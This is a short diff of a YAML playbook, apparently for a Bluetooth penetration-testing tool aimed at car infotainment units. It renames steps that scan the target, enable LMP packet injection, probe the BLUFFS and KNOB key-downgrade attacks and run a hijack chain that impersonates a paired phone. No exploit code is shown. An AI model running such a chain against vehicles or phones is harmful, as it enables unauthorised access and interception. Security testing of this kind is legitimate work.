@@ -7,19 +7,19 @@ requires:
   - Phone MAC address (--phone)
 
 steps:
-  - command: vulnscan {target} -i {hci}
+  - command: vulnscan {target} -a {hci}
     description: Initial vulnerability scan
 
   - command: adapter firmware-set lmp-size 17
     description: Unlock full LMP PDU injection
 
-  - command: bluffs {target} --variant probe -i {hci}
+  - command: exploit {target} bluffs --variant probe
     description: Test BLUFFS session key downgrade
 
-  - command: knob probe {target} -i {hci}
+  - command: exploit {target} knob
     description: Test KNOB key size reduction
 
-  - command: hijack {target} {phone} -i {hci}
+  - command: exploit {target} hijack {phone}
     description: Full hijack chain (impersonate phone)
 
   - command: report -o ivi_attack_report.html
